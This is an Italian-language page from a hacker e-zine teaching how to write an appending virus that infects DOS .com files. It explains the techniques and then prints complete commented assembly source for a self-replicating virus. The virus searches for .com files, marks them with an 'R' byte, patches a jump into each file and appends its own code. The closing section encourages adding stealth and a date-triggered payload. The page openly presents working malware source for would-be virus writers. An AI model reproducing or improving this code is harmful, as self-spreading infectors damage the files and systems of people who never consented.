<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>REN - ZINE #3&nbsp; dedicato a VirusBuster&nbsp; Infezione di files com</title>
<meta name="GENERATOR" content="DA RENEGADE HTML MAKER ">
</head>

<body background="gray.ren        ">

<p align="center"><font face="Copperplate Gothic Bold" size="5" color="#FFFF00">L'infezione
di files .com</font></p>

<p align="center"><img src="myskull.ren" alt="myskull.ren (40695 bytes)" WIDTH="100"
HEIGHT="75"></p>

<p align="center">&nbsp;</p>

<p align="left"><font face="Arial" size="3" color="#FFFF00">Un semplice overwriting virus
l'abbiamo già conosciuto nella zine scorsa.Come avrete notato il principio di un tale
virus e molto semplice, le sue possibili azioni sono assai limitate e non è neanche
difficile a programmarne uno.Lo scopo di un overwriting virus è, intenzionato o no, la
distruzione di dati.La cosa importante da capire quando si sta iniziando ed imparando è
di non fermarsi restando a questo livello di virus, visto che il principio di ogni virus
è quello di sopravvivere il più lungo possibile.Ciò significa che è indispensabile
avanzare di livello.Dobbiamo cercare di nascondere il nostro virus in quanto sia possibile
farlo con la nostra conoscienza dell'assembly.Per ora non tratterò nessuna tattica di
stealth oppure simile, ma ci dedichiamo a quello che viene dopo l'overwriting virus,
l'appending virus.Una volta che l'overwriting avrà scritto il suo codice, l'unica cosa
che verrà eseguita è il codice virale, quindi addirittura l'utente lo nota
immediatamente. L'appending virus, il principo l'abbiamo già discusso nella prima REN -
ZINE, è, paragonato all'overwriting virus, più soffisticato e molto più
&quot;intelligente&quot;. L'appending virus, lo dice già il nome, si appende al file e
cambia solamente qualche byte all'inizio del file, in modo che quando verrà eseguito,
prima di tutto il jump farà continuare l'esecuzione alla fine del file, dove si trova il
virus, e poi ritorna all'inizio del file, continuando con il file vero e proprio.Così il
programma non sarà cancellato ne modificato, quindi l'utente non se ne accorgerà che il
file è stato infettato.L'unica cosa che potrebbe notare è che l'esecuzione potrebbe
essere un pochino più lenta, visto che prima deve essere eseguito il virus.Poichè il
virus si appende, la grandezza del file aumenterà, cosa che spesso gli anti-virus
sfruttano per controllare i files.Anche per questo comunque ci sono delle soluzioni, che
però per ora sarebbere troppo complicate.</font></p>

<p align="left"><font face="Arial" size="3" color="#FFFF00">Ma che cosa significa tutto
ciò per la programmazione in assembly ? Bene, il codice che salva gli attributi, l'ora e
simile resta sempre lo stesso, non cambia assolutamente nulla.Però dobbiamo far
attenzione a qualche cosettina.Come già detto, il virus modifica qualche byte
all'inizio.Spesso si parla di 3 bytes che sono da salvare, e questi 3 bytes corrispondono
al jump, cioè il jump che che salta al codice virale alla fine del file occupa 3
bytes.Dopo l'infezione vogliamo che il programma verrà eseguito normalmente, quindi
dobbiamo ripristinare i primi 3 bytes, altrimenti il tutto non funzionerà.Ma dobbiamo
tener conto anche altri di fattori molto importanti.Quando avremo compilato il nostro file
.com, i jumps e le call saranno relativi all'instruction pointer attuale, mentre le
variabili veranno salvate usando un indirizzo assoluto.Questo significa che un jump che lo
facciamo saltare una certa quantità di bytes in avanti, lo farà in qualunque parte
indipendentemente dalla sua posizione.Invece per i nostri dati, se sono stati salvati in
un certo posto nella memoria, verrà cercato nella sua posizione originale. Quindi quando
vogliamo ridare il controllo al file originale, usando allora indirizzi sbagliati,
potrebbe succedere che modifichiamo codice del programma originale, ciò che vogliamo
assolutamente evitare.Un'altra cosa importante è il DTA, che sta per Disk Transfer
Address.Nel DTA sono contenuti maggiormente dati che riguardano l'I/O, ma la cosa da
capire è che si trova all'indirizzo identico del PSP (Program Segment Prefix) dove sono
salvati i parametri della riga di comando.Se continuiamo a programmare senza pensare al
DTA, anche facendo una semplicissma operazione, i dati della riga di comando verrano
persi.L'unica soluzione è quella di spostare il DTA, e infine ripristinarlo di nuovo
quando ritorniamo al programma originale.</font></p>

<p align="left"><font face="Arial" size="3" color="#FFFF00">Ora vediamo cosa ciò
significa per la nostra programmazione.Iniziamo con il codice per salvare i primi 3 bytes</font></p>

<p align="left"><font face="Arial" size="3" color="#00FF00">mov ah,3fh ; </font><font
face="Arial" size="3" color="#FFFF00">funzione 3fh legge dal file</font></p>

<p align="left"><font face="Arial" size="3" color="#00FF00">mov cx,3 ; </font><font
face="Arial" size="3" color="#FFFF00">la quantità di bytes da leggere</font></p>

<p align="left"><font face="Arial" size="3" color="#00FF00">mov dx, Primi3_bytes ; </font><font
face="Arial" size="3" color="#FFFF00">ecco che li salviamo in dx</font></p>

<p align="left"><font face="Arial" size="3" color="#00FF00">int 21h ; </font><font
face="Arial" size="3" color="#FFFF00">esegue ciò</font></p>

<p><font face="Arial" size="3" color="#FFFF00">Per ritornare al programma originale basta
un semplice</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov di,100h ; </font><font face="Arial"
size="3" color="#FFFF00">l'offset d'inizio del file com</font></p>

<p><font face="Arial" size="3" color="#00FF00">jmp di ; </font><font face="Arial" size="3"
color="#FFFF00">e quindi ci andiamo</font></p>

<p><font face="Arial" size="3" color="#FFFF00">Ecco quanto riguarda il discorso del delta
offset:</font></p>

<p><font face="Arial" size="3" color="#00FF00">call delta_offset</font></p>

<p><font face="Arial" size="3" color="#00FF00">delta_offset : pop bp</font></p>

<p><font face="Arial" size="3" color="#00FF00">sub bp,offset delta ; </font><font
face="Arial" size="3" color="#FFFF00">Risolviamo il problema chiamando una subroutine,
salvando l'offset del prossimo comando nello stack,sottraendo quindi&nbsp; il vecchio
offset dopo la call e salvando il risultato in bp.</font></p>

<p><font face="Arial" size="3" color="#FFFF00">Adesso invece esaminiamo il DTA</font></p>

<p><font face="Arial" size="3" color="#FFFF00">Offset
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Funzione
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Grandezza</font></p>

<p><font face="Arial" size="3" color="#00FF00">0000h
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Riservato
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
21 bytes</font></p>

<p><font face="Arial" size="3" color="#00FF00">0015h
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Attributi- files
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1 byte</font></p>

<p><font face="Arial" size="3" color="#00FF00">0016h
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Ora - files
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
2 bytes</font></p>

<p><font face="Arial" size="3" color="#00FF00">0018h
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Data - files
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
2 bytes</font></p>

<p><font face="Arial" size="3" color="#00FF00">001Ah
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Grandezza-file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4
bytes</font></p>

<p><font face="Arial" size="3" color="#00FF00">001Eh
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Nome del file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13
bytes</font></p>

<p><font face="Arial" size="3" color="#FFFF00">Come vedete sarebbe fatale non spostare il
DTA cancellando questi dati molto importanti.L'indirizzo del DTA è l'offset 80h e lo si
può salvare usando la funzione 1Ah dell'interrupt 21h.</font></p>

<p><font face="Arial" size="3" color="#00FF00">lea dx,[fine+bp<sup> </sup>] ; </font><font
face="Arial" size="3" color="#FFFF00">spostiamo il DTA alla fine del nostro virus</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov ah,1ah ;&nbsp; </font><font
face="Arial" size="3" color="#FFFF00">la funzione che rende possibile farlo</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21h ; </font><font face="Arial"
size="3" color="#FFFF00">lo eseguiamo</font></p>

<p><font face="Arial" size="3" color="#00FF00">&nbsp; </font></p>

<p><font face="Arial" size="3" color="#FFFF00">Quello che segue è un semplicissimo
esempio di un appending virus che,pur nella sua semplicità, almeno non distrugge il file
originale, così che l'utente non se ne renderà conto dell'infezione quando eseguirà un
file .com</font></p>

<p><font face="Arial" size="3" color="#00FF00">.model tiny ; </font><font face="Arial"
size="3" color="#FFFF00">il modello usato (un solo segmento)</font></p>

<p><font face="Arial" size="3" color="#00FF00">.code ; </font><font face="Arial" size="3"
color="#FFFF00">ecco che diamo l'ordine di creare un code segment</font></p>

<p><font face="Arial" size="3" color="#00FF00">radix 16 ; </font><font face="Arial"
size="3" color="#FFFF00">con quest'opzione possiamo lasciar via le &quot;h&quot; per i
numeri esadecimali</font></p>

<p><font face="Arial" size="3" color="#00FF00">org 100 ; </font><font face="Arial"
size="3" color="#FFFF00">l'inizio del com file</font></p>

<p><font face="Arial" size="3" color="#00FF00">inizio : jmp continua ; </font><font
face="Arial" size="3" color="#FFFF00">l'abbiamo spiegato il perchè del jump</font></p>

<p><font face="Arial" size="3" color="#00FF00">db &quot;R&quot; ; </font><font
face="Arial" size="3" color="#FFFF00">questo sarà il nostro byte d'identificazione che
troveremo in ogni file infettato dal nostro virus</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 20 ; </font><font face="Arial" size="3"
color="#FFFF00">ed usciamo</font></p>

<p><font face="Arial" size="3" color="#00FF00">continua: call delta_offset ; </font><font
face="Arial" size="3" color="#FFFF00">quindi il discorso del delta offset</font></p>

<p><font face="Arial" size="3" color="#00FF00">delta_offset: pop bp</font></p>

<p><font face="Arial" size="3" color="#00FF00">sub bp,offset delta_offset ; </font><font
face="Arial" size="3" color="#FFFF00">ora sapiamo cosa significa tutto ciò</font></p>

<p><font face="Arial" size="3" color="#00FF00">salva_bytes: lea si,[offset
bytes_originali+bp<sup> </sup>] ; </font><font face="Arial" size="3" color="#FFFF00">ora
inizia il codice per salvare i bytes</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov di,0100 ; </font><font face="Arial"
size="3" color="#FFFF00">ovviamente all'inizio, cioè l'offset 0100h</font></p>

<p><font face="Arial" size="3" color="#00FF00">movsw ; </font><font face="Arial" size="3"
color="#FFFF00">mov string (word)</font></p>

<p><font face="Arial" size="3" color="#00FF00">movsw</font></p>

<p><font face="Arial" size="3" color="#00FF00">push cs ; </font><font face="Arial"
size="3" color="#FFFF00">salviamo cs</font></p>

<p><font face="Arial" size="3" color="#00FF00">pop ds ; </font><font face="Arial" size="3"
color="#FFFF00">e lo ripristiniamo in ds</font></p>

<p><font face="Arial" size="3" color="#00FF00">lea dx, [indirizzo_dta+bp] ; </font><font
face="Arial" size="3" color="#FFFF00">ora spostiamo il DTA alla fine del virus</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov ah,1a ; </font><font face="Arial"
size="3" color="#FFFF00">la funzione che permette ciò</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21 ; </font><font face="Arial" size="3"
color="#FFFF00">ecco fatto</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov byte ptr [num_infezioni+bp],0 ; </font><font
face="Arial" size="3" color="#FFFF00">azzeriamo il contatore delle infezioni</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov ah,4e ; </font><font face="Arial"
size="3" color="#FFFF00">trova il primo file</font></p>

<p><font face="Arial" size="3" color="#00FF00">lea dx, [offset tipo_file+bp] ; </font><font
face="Arial" size="3" color="#FFFF00">che corrisponde a tipo_file,quindi un file .com</font></p>

<p><font face="Arial" size="3" color="#00FF00">controlla : cmp byte ptr
[num_infezioni+bp],X; </font><font face="Arial" size="3" color="#FFFF00">qui dobbiamo
inserire quanti files vogliamo infettare ad ogni esecuzione</font></p>

<p><font face="Arial" size="3" color="#00FF00">je ripristina_dta ; </font><font
face="Arial" size="3" color="#FFFF00">se abbiamo finito possiamo iniziare la fase di
uscita ripristinando per prima cosa il DTA</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21</font></p>

<p><font face="Arial" size="3" color="#00FF00">jc ripristina_dta; </font><font
face="Arial" size="3" color="#FFFF00">se non ce ne sono files vai direttamente a
ripristinare il DTA</font></p>

<p><font face="Arial" size="3" color="#00FF00">call apri ; </font><font face="Arial"
size="3" color="#FFFF00">altrimenti continuiamo ad aprire il file</font></p>

<p><font face="Arial" size="3" color="#00FF00">prossimo_file: mov ah,4f ; </font><font
face="Arial" size="3" color="#FFFF00">trova il prossimo file</font></p>

<p><font face="Arial" size="3" color="#00FF00">jmp controlla ; </font><font face="Arial"
size="3" color="#FFFF00">ed la stessa cosa continua da capo</font></p>

<p><font face="Arial" size="3" color="#00FF00">ripristina_dta: mov ah,1a&nbsp; ; </font><font
face="Arial" size="3" color="#FFFF00">la famosa funzione che ci permette di settare il DTA</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov dx,80 ; </font><font face="Arial"
size="3" color="#FFFF00">come sappiamo il DTA si trova all'offset 80h</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21 ; </font><font face="Arial" size="3"
color="#FFFF00">e lo eseguiamo</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov di,0100 ; </font><font face="Arial"
size="3" color="#FFFF00">ed ora il codice che restituisce il controllo al programma
originale</font></p>

<p><font face="Arial" size="3" color="#00FF00">push di</font></p>

<p><font face="Arial" size="3" color="#00FF00">ret </font></p>

<p><font face="Arial" size="3" color="#00FF00">apri: lea dx, [indirizzo_dta+1e+bp] ; </font><font
face="Arial" size="3" color="#FFFF00">usiamo pure direttamene indirizzo_dta, che essendo
un label alla posizione giusta (fine del virus) può essere ancora utile</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov ax,3d02 ; </font><font face="Arial"
size="3" color="#FFFF00">funzione per aprire il file</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21 ; </font><font face="Arial" size="3"
color="#FFFF00">lo facciamo</font></p>

<p><font face="Arial" size="3" color="#00FF00">jnc infetta ; </font><font face="Arial"
size="3" color="#FFFF00">se va tutto bene andiamo ad infettarlo</font></p>

<p><font face="Arial" size="3" color="#00FF00">ret ; </font><font face="Arial" size="3"
color="#FFFF00">altrimenti ritorniamo indietro</font></p>

<p><font face="Arial" size="3" color="#00FF00">infetta: xchg bx,ax ; </font><font
face="Arial" size="3" color="#FFFF00">carichiamo il nome del file in bx</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov cx,0004 ; </font><font face="Arial"
size="3" color="#FFFF00">quantità di bytes da leggere</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov ah,3f ; </font><font face="Arial"
size="3" color="#FFFF00">funzione dell'interrupt 21h per leggere dal file</font></p>

<p><font face="Arial" size="3" color="#00FF00">lea dx,[bytes_originali+bp] </font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21 ; </font><font face="Arial" size="3"
color="#FFFF00">la eseguiamo</font></p>

<p><font face="Arial" size="3" color="#00FF00">cmp byte ptr
[bytes_originali+3+bp],&quot;R&quot; ; </font><font face="Arial" size="3" color="#FFFF00">controlla
se il quarto byte corrisponde ad una &quot;R&quot;, quindi se il file è già stato
infettato </font></p>

<p><font face="Arial" size="3" color="#00FF00">jz chiudi ; </font><font face="Arial"
size="3" color="#FFFF00">se fosse così possiamo andarcene</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov ax,4202 ; </font><font face="Arial"
size="3" color="#FFFF00">setta la posizione del file (alla fine)</font></p>

<p><font face="Arial" size="3" color="#00FF00">xor cx,cx ; </font><font face="Arial"
size="3" color="#FFFF00">azzeriamo cx</font></p>

<p><font face="Arial" size="3" color="#00FF00">xor dx,dx</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21 ; </font><font face="Arial" size="3"
color="#FFFF00">fatto</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov ax,4000 ; </font><font face="Arial"
size="3" color="#FFFF00">scriverà i nostri dati</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov cx,0004 ; </font><font face="Arial"
size="3" color="#FFFF00">quantità di bytes da scrivere</font></p>

<p><font face="Arial" size="3" color="#00FF00">lea dx,[bytes_jump+bp] ; </font><font
face="Arial" size="3" color="#FFFF00">carichiamo i bytes necessari per il jump</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21 ; </font><font face="Arial" size="3"
color="#FFFF00">e con questo abbiamo inserito il jump verso il codice virale all'inizio
del file originale</font></p>

<p><font face="Arial" size="3" color="#00FF00">inc byte ptr [num_infezioni+bp] ; </font><font
face="Arial" size="3" color="#FFFF00">incrementa il contatore delle infezioni visto che
questo corrisponde ad un infezione riuscita</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov ax,4202 ; </font><font face="Arial"
size="3" color="#FFFF00">ci ritroviamo alla fine del file</font></p>

<p><font face="Arial" size="3" color="#00FF00">xor cx,cx</font></p>

<p><font face="Arial" size="3" color="#00FF00">xor dx,dx</font><font face="Arial" size="3"
color="#FFFF00"> ; azzeriamo i registri</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov ah,40 ; </font><font face="Arial"
size="3" color="#FFFF00">funzione 40h che scrive sul file</font></p>

<p><font face="Arial" size="3" color="#00FF00">mov cx,(indirizzo_dta - continua) ; </font><font
face="Arial" size="3" color="#FFFF00">la quantità da scrivere nel file, quindi il virus</font></p>

<p><font face="Arial" size="3" color="#00FF00">lea dx, [continua+bp]; </font><font
face="Arial" size="3" color="#FFFF00">l'inizio</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21 ; </font><font face="Arial" size="3"
color="#FFFF00">il codice quindi viene eseguito</font></p>

<p><font face="Arial" size="3" color="#00FF00">chiudi: mov ah,3e ; </font><font
face="Arial" size="3" color="#FFFF00">funzione 3e che chiude il file</font></p>

<p><font face="Arial" size="3" color="#00FF00">int 21 ; </font><font face="Arial" size="3"
color="#FFFF00">chiude il file</font></p>

<p><font face="Arial" size="3" color="#00FF00">ret</font></p>

<p><font face="Arial" size="3" color="#00FF00">bytes_originali: db 00,00,00,00 ; </font><font
face="Arial" size="3" color="#FFFF00">qui verrano salvati i 4 bytes</font></p>

<p><font face="Arial" size="3" color="#00FF00">bytes_jump : db 0e9,03,00,&quot;R&quot; ; </font><font
face="Arial" size="3" color="#FFFF00">ecco il jump in valori esadecimali</font></p>

<p><font face="Arial" size="3" color="#00FF00">num_infezioni : db 0 ; </font><font
face="Arial" size="3" color="#FFFF00">per il contatore delle infezioni</font></p>

<p><font face="Arial" size="3" color="#00FF00">tipo_file: db &quot;*.co*&quot;,0 ; </font><font
face="Arial" size="3" color="#FFFF00">il tipo di file da infettare, quindi i files .com</font></p>

<p><font face="Arial" size="3" color="#00FF00">indirizzo_dta label ; </font><font
face="Arial" size="3" color="#FFFF00">viene usato solamente come punto di riferimento</font></p>

<p><font face="Arial" size="3" color="#00FF00">end inizio ; </font><font face="Arial"
size="3" color="#FFFF00">la fine del nostro virus</font></p>

<p>&nbsp;</p>

<p><font face="Arial" size="3" color="#FFFF00">Come già detto,questo è un esempio molto
semplice.Comunque credo che si possano imparare le cose più importanti.Per essere un
virus che potrebbe sopravvivere nel mondo DOS un pochino più a lungo ci mancano parecchie
cose. Per esempio il virus non controlla nemmeno se si tratta di un file com vero, cioè
non controlla se è presente la signature MZ del formato exe,oppure non salva e ripristina
attributi,data,ora e soprattutto non ha alcune capabilità di stealth, e si noterà subito
l'incremento della grandezza dei files.Però ovviamente tutto ciò e anche un sacco di
altre cose si possono aggiungere, come anche un payload decente, che si attiva ad una
certa data per esempio.Comunque sia, ritengo che questo sia già un buon passa in avanti,
paragonato con l'overwriting virus, che non può assolutamente concorrere in nessun caso
neanche con il più semplice appending virus.</font></p>

<p>&nbsp;</p>

<p align="center"><font face="Arial Black" size="4" color="#00FF00">Indice - </font><font
face="Arial Black" size="4" color="#000080"><a href="indice.ren">VAI</a></font></p>
</body>
</html>
